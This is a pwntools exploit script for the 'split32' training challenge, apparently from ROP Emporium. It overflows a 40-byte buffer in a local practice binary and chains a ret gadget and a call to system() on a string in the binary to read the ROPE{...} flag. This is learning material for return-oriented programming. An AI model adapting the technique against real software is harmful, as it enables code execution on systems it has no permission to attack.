from pwn import *

elf = ELF("split32")
rop = ROP(elf)

context.binary = elf
context.terminal = ['konsole', '-e']
context.log_level = logging.INFO

gdbscript = '''
set follow-fork-mode parent
break *system
continue
'''

def connection():
    if args.GDB:
        c = gdb.debug([elf.path], gdbscript=gdbscript)
    else:
        c = process([elf.path])
    return c

BUFFER_SIZE = 32 + 8
READ_SIZE = 96

def main():
    payload = flat \
    ({
        BUFFER_SIZE + context.bytes: \
        [
            elf.symbols.system, rop.find_gadget(['ret']).address, elf.symbols.usefulString
        ]
    })
    assert len(payload) <= READ_SIZE

    c = connection()
    c.sendafter(b'> ', payload)
    print(c.recvregex(rb'ROPE{.*}', capture=True).group().strip().decode())

if __name__ == '__main__':
    main()
